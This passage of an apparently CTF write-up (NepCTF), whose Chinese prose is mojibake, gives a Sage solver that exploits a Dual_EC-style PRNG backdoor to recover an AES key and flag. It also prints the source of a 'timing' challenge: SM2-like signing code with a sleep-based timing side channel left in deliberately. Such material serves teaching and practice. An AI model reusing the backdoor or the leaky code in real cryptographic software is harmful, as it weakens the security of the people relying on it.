$s_i$ï¼Œçœ‹ä¼¼å®‰å…¨çš„ä½“åˆ¶è¢«æ”»ç ´ã€‚</p><p>è®° $k_i = (s_i \cdot P)_x$ï¼Œæœ‰ï¼š</p><p>$\begin{align} d \cdot r_{i-1} &amp; = {(d \cdot R_{i-1})_x = (d \cdot k_{i-1} \cdot Q)_x} = {(k_{i-1} \cdot d \cdot Q)_x = (k_{i-1} \cdot P)_x} = {((s_{i-1} \cdot P)_x \cdot P)_x = s_i} \end{align}$</p><p>é¢˜é‡Œ $c=r_{i-1}$ï¼Œæ„é€  $d \cdot c = s_i$ï¼Œåˆ™å¯ä»¥æ¨å‡ºä¸‹ä¸€ä¸ªéšæœºæ•° $r_i=((s_i \cdot P)_x \cdot Q)_x$ï¼Œå–é«˜16*8ä½ä¸ºAESçš„Keyã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">a = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853948</span></span><br><span class="line">b = <span class="number">41058363725152142129326129780047268409114441015993725554835256314039467401291</span></span><br><span class="line">p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">n = <span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">P = (<span class="number">72696788778535848020209987825324097844942627382508830211685965810687985426258</span>, <span class="number">49180397040468497821240854375656422791216946832858522054245540263375986110762</span>)</span><br><span class="line">d = <span class="number">66604141534275704476445937214374130642068729921454877238730830814793201802544</span></span><br><span class="line">Q = (<span class="number">48439561293906451759052585252797914202762949526041747995844080717082404635286</span>, <span class="number">36134250956749795798585127919587881956611106672985015071877198253568414405109</span>)</span><br><span class="line">c = <span class="number">59100197418944667413449341413044666843726352095054393072750502893110293231642</span></span><br><span class="line">ct = <span class="number">25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span></span><br><span class="line"></span><br><span class="line">P = E(P)</span><br><span class="line">Q = E(Q)</span><br><span class="line">R0 = E.lift_x(c)</span><br><span class="line">s1 = (d*R0)[<span class="number">0</span>]</span><br><span class="line">s2 = ((s1*P)[<span class="number">0</span>]*P)[<span class="number">0</span>]</span><br><span class="line">r1 = ((s1*P)[<span class="number">0</span>]*Q)[<span class="number">0</span>]</span><br><span class="line">key = r1 &gt;&gt; ((<span class="number">32</span> - <span class="number">16</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">key = long_to_bytes(key)</span><br><span class="line">ct = long_to_bytes(ct)</span><br><span class="line"><span class="built_in">print</span>(cipher.decrypt(ct))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NepCTF&#123;NS4_b4ckd00r_1n_ps3ud0_r4nd0m_g3n3r4t0r&#125;\x01&#x27; </span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="timing"><a href="#timing" class="headerlink" title="timing"></a>timing</h3><blockquote><p>ç‰¢ä¸å¯ç ´çš„ç®—æ³•ï¼Œæˆ–è®¸ä¼šåœ¨å…¶ä»–åœ°æ–¹å‡ºç°é—®é¢˜ï¼Ÿ<br>(å®¹å™¨ä¸‹å‘åï¼Œå¸ˆå‚…è‡ªè¡Œncå“¦ï½ï½ï½)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> perf_counter_ns <span class="keyword">as</span> clock1</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ecc_table = &#123;</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span></span><br><span class="line">         <span class="string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">         <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TSM2</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, sk</span>):</span></span><br><span class="line">        self.ecc_table = ecc_table</span><br><span class="line">        self.n = <span class="built_in">int</span>(ecc_table[<span class="string">&#x27;n&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">        self.para_len = <span class="built_in">len</span>(ecc_table[<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line">        self.ecc_a3 = (<span class="built_in">int</span>(ecc_table[<span class="string">&#x27;a&#x27;</span>], base=<span class="number">16</span>) +</span><br><span class="line">                       <span class="number">3</span>) % <span class="built_in">int</span>(ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        self.sk = sk</span><br><span class="line">        self.pk = self.kg(self.sk, ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">self, data, K</span>):</span></span><br><span class="line">        e = data</span><br><span class="line">        d = self.sk</span><br><span class="line">        k = K</span><br><span class="line"></span><br><span class="line">        P1 = self.kg(k, self.ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">        x = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        R = ((e + x) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        <span class="keyword">if</span> R == <span class="number">0</span> <span class="keyword">or</span> R + k == <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        d_1 = <span class="built_in">pow</span>(</span><br><span class="line">            d+<span class="number">1</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>) - <span class="number">2</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        S = (d_1*(k + R) - R) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> S == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (R, S)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">self, Sign, data</span>):</span></span><br><span class="line">        r = <span class="built_in">int</span>(Sign[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(Sign[self.para_len:<span class="number">2</span> * self.para_len], <span class="number">16</span>)</span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % self.n</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        P1 = self.kg(s, self.ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">        P2 = self.kg(t, self.pk)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> P1 == P2:</span><br><span class="line">            P1 = <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = self._double_point(P1)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            P1 = <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = self._add_point(P1, P2)</span><br><span class="line">            P1 = self._convert_jacb_to_nor(P1)</span><br><span class="line"></span><br><span class="line">        x = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> r == ((e + x) % self.n)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kg</span>(<span class="params">self, k, Point</span>):</span></span><br><span class="line">        k=k%self.n</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span></span><br><span class="line">        Point = <span class="string">&#x27;%s%s&#x27;</span> % (Point, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        mask_str = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.para_len - <span class="number">1</span>):</span><br><span class="line">            mask_str += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        mask = <span class="built_in">int</span>(mask_str, <span class="number">16</span>)</span><br><span class="line">        Temp = Point</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(self.para_len * <span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                Temp = self._double_point(Temp)</span><br><span class="line">            <span class="keyword">if</span> (k &amp; mask) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    Temp = self._add_point(Temp, Point)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flag = <span class="literal">True</span></span><br><span class="line">                    Temp = Point</span><br><span class="line">            k = k &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self._convert_jacb_to_nor(Temp)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_double_point</span>(<span class="params">self, Point</span>):</span></span><br><span class="line">        t1=clock1()</span><br><span class="line">        l = <span class="built_in">len</span>(Point)</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        <span class="keyword">if</span> l &lt; self.para_len * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x1 = <span class="built_in">int</span>(Point[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            y1 = <span class="built_in">int</span>(Point[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l == len_2:</span><br><span class="line">                z1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                z1 = <span class="built_in">int</span>(Point[len_2:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T6 = (z1 * z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y1 * y1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x1 + T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (x1 - T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T3 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (y1 * z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * <span class="number">8</span>) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (x1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * <span class="number">3</span>) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (T6 * T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (self.ecc_a3 * T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 + T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            z3 = (T3 + T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T1 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            x3 = (T3 - T5) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (T5 % <span class="number">2</span>) == <span class="number">1</span>:</span><br><span class="line">                T4 = (T5 + ((T5 + <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)) &gt;&gt; <span class="number">1</span>) - T3) % <span class="built_in">int</span>(</span><br><span class="line">                    self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                T4 = (T5 + (T5 &gt;&gt; <span class="number">1</span>) - T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (T1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            y3 = (T1 - T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            t2=clock1()</span><br><span class="line">            <span class="keyword">if</span>(t2-t1&lt;<span class="number">1e7</span>):</span><br><span class="line">                sleep(<span class="number">0.01</span>-(((t2-t1))/<span class="number">1000000000.0</span>))</span><br><span class="line">            <span class="keyword">return</span> form % (x3, y3, z3)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_add_point</span>(<span class="params">self, P1, P2</span>):</span></span><br><span class="line">        t1=clock1()</span><br><span class="line">        <span class="keyword">if</span> P1 == <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s%s&#x27;</span> % (P2, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> P2 == <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        l1 = <span class="built_in">len</span>(P1)</span><br><span class="line">        l2 = <span class="built_in">len</span>(P2)</span><br><span class="line">        <span class="keyword">if</span> (l1 &lt; len_2) <span class="keyword">or</span> (l2 &lt; len_2):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            X1 = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            Y1 = <span class="built_in">int</span>(P1[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l1 == len_2:</span><br><span class="line">                Z1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Z1 = <span class="built_in">int</span>(P1[len_2:], <span class="number">16</span>)</span><br><span class="line">            x2 = <span class="built_in">int</span>(P2[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            y2 = <span class="built_in">int</span>(P2[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (Z1 * Z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y2 * Z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x2 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T3 - X1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 + X1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 - Y1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            Z3 = (Z1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (T1 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (X1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            X3 = (T5 - T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (Y1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T4 - X3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            Y3 = (T1 - T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            t2=clock1()</span><br><span class="line">            <span class="keyword">if</span>(t2-t1&lt;<span class="number">1e8</span>):</span><br><span class="line">                sleep(<span class="number">0.1</span>-(((t2-t1))/<span class="number">1000000000.0</span>))</span><br><span class="line">            <span class="keyword">return</span> form % (X3, Y3, Z3)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_convert_jacb_to_nor</span>(<span class="params">self, Point</span>):</span></span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        x = <span class="built_in">int</span>(Point[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        y = <span class="built_in">int</span>(Point[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">        z = <span class="built_in">int</span>(Point[len_2:], <span class="number">16</span>)</span><br><span class="line">        z_inv = <span class="built_in">pow</span>(</span><br><span class="line">            z, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>) - <span class="number">2</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        z_invSquar = (z_inv * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_invQube = (z_invSquar * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        x_new = (x * z_invSquar) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        y_new = (y * z_invQube) % <span class="built_in">int</span>(self.ecc_table[<span 